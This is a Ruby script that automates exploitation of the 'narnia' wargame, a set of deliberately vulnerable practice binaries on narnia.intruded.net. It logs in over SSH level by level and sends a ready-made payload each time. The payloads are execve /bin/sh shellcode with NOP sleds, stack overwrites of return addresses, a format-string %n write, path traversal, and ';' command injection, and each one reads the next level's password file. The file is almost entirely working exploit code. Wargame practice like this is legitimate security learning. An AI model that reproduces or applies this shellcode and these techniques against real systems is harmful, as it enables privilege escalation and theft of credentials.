#!/usr/bin/env ruby

require 'pty'
require 'expect'

HOST = "narnia.intruded.net"
PORT = 10102

class IntrudedExploit

  @@narnia = [
    { :usr => 'level1', 
      :comm => '(echo -e "00001111000011110000\357\276\255\336"; sleep 1; echo cat /home/level2/.passwd | cat) | /wargame/level1' },
    { :usr => 'level2', 
      :comm => 'echo cat /home/level3/.passwd | EGG=`echo -e "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41\x42\x42\x42\x42"` /wargame/level2' },
    { :usr => 'level3', 
      :comm => 'EGG=`echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41\x42\x42\x42\x42\x60\xfb\xff\xbf"`; echo cat /home/level4/.passwd | /wargame/level3 $EGG' },
    { :usr => 'level4',
      :comm => 'cd /tmp; touch passwd; chmod 777 passwd; /wargame/level4 //../tmp/../tmp/../home/level5/.passwd; cat passwd' },
    { :usr => 'level5',
      :comm => 'echo cat /home/level6/.passwd | /wargame/level5 `echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41\x42\x42\x42\x42\x70\xfb\xff\xbf"`' },
    { :usr => 'level6',
      :comm => 'echo cat /home/level7/.passwd | /wargame/level6 `echo -e "\x3c\xfa\xff\xbf%.468d%d%d%d%d%n"`' },
    { :usr => 'level7',
      :comm => 'echo -e "\#\!/bin/sh\ncat /home/level8/.passwd" > /tmp/buu; chmod 755 /tmp/buu; /wargame/level7 `echo -e "/tmp/buu;AAA\x90\x89\xee\xb7"` xx' },
    { :usr => 'level8' }
      ]

  def exec
    @next_pwd = "narnia"

    @@narnia.each do |level|
      puts "#{level[:usr]}: #{@next_pwd}"
      if not level[:comm].nil?
        PTY.spawn("ssh #{level[:usr]}@#{HOST} -p #{PORT}") do |r, w, pid|
          r.expect("password:") { w.write("#{@next_pwd}\r") }
          r.expect(/[$#]/) { w.write(level[:comm]+"\r") }
          r.each do |line| 
            if line.length == 10
              @next_pwd = line
              break
            end
          end
        end
      end
    end
  end

end

level1 = IntrudedExploit.new()
level1.exec
